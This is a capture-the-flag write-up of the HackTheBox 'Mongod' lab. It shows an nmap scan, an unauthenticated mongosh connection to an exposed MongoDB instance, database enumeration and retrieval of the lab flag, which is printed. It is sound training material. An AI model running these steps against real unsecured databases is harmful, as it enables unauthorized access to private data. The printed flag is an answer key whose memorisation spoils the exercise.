---
title: "HackTheBox Starting Point: Mongod Walkthrough"
date: 2025-02-06
description: ''
image: '/public/static/htb-cover.jpg'
tags: ["Database","Misconfiguration","Reconnaissance","MongoDB"]
authors: ['chjwoo']
---

In this blog post, we will walk through the process of enumerating and exploiting an unsecured MongoDB instance to retrieve sensitive data. This process involves reconnaissance using Nmap, gaining a foothold through MongoDB shell access, and extracting valuable information.

## Reconnaissance

The first step in any penetration test is reconnaissance. We use `nmap` to scan all open ports and detect running services on the target machine `10.129.6.96`.

```bash
└─$ sudo nmap -sV -p- --min-rate=100 10.129.6.96 --stats-every=5s
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 10:08 WIB
Nmap scan report for 10.129.6.96
Host is up (0.26s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 747.66 s
```

From the results, we identify two open ports:

- **Port 22**: OpenSSH 8.2p1 (used for remote SSH access)
- **Port 27017**: MongoDB 3.6.8 (potentially misconfigured and exploitable)

## Foothold

Since MongoDB is running on an open port, we attempt to connect to it using `mongosh`, the MongoDB shell.

```bash
└─$ ./mongosh mongodb://10.129.6.96:27017
Current Mongosh Log ID: 67a42d3a2432bcddf1fe6910
Connecting to:          mongodb://10.129.6.96:27017/?directConnection=true&appName=mongosh+2.3.2
Using MongoDB:          3.6.8
Using Mongosh:          2.3.2
mongosh 2.3.9 is available for download: https://www.mongodb.com/try/download/shell

For mongosh info see: https://www.mongodb.com/docs/mongodb-shell/

To help improve our products, anonymous usage data is collected and sent to MongoDB periodically (https://www.mongodb.com/legal/privacy-policy).
You can opt-out by running the disableTelemetry() command.

------
   The server generated these startup warnings when booting
   2025-02-06T03:05:44.468+0000: 
   2025-02-06T03:05:44.468+0000: ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
   2025-02-06T03:05:44.468+0000: **          See http://dochub.mongodb.org/core/prodnotes-filesystem
   2025-02-06T03:05:46.065+0000: 
   2025-02-06T03:05:46.065+0000: ** WARNING: Access control is not enabled for the database.
   2025-02-06T03:05:46.065+0000: **          Read and write access to data and configuration is unrestricted.
   2025-02-06T03:05:46.065+0000:
------
```

From the warnings above, we can see that **access control is not enabled**, meaning that anyone can read and write data in this MongoDB instance without authentication.

### Exploring the Database

Now that we have access, we can list the available databases.

```bash
test> show dbs;
admin                  32.00 KiB
config                 72.00 KiB
local                  72.00 KiB
sensitive_information  32.00 KiB
users                  32.00 KiB
```

The database `sensitive_information` looks interesting. Let's switch to it and list its collections.

```bash
test> use sensitive_information
switched to db sensitive_information
sensitive_information> show collections
flag
```

A collection named `flag` is present. Let's retrieve its contents.

```bash
sensitive_information> db.flag.find().pretty()
[
  {
    _id: ObjectId('630e3dbcb82540ebbd1748c5'),
    flag: '1b6e6fb359e7c40241b6d431427ba6ea'
  }
]
```

We have successfully retrieved the flag stored in the MongoDB database!

## Flags

This demonstrates how an unsecured MongoDB instance can be exploited to retrieve sensitive data. Proper access control configurations should always be enforced to prevent unauthorized access.

```bash
1b6e6fb359e7c40241b6d431427ba6ea
```

## Useful Resources

For further reading, check out the following:

[https://gist.github.com/bradtraversy/f407d642bdc3b31681bc7e56d95485b6](https://gist.github.com/bradtraversy/f407d642bdc3b31681bc7e56d95485b6)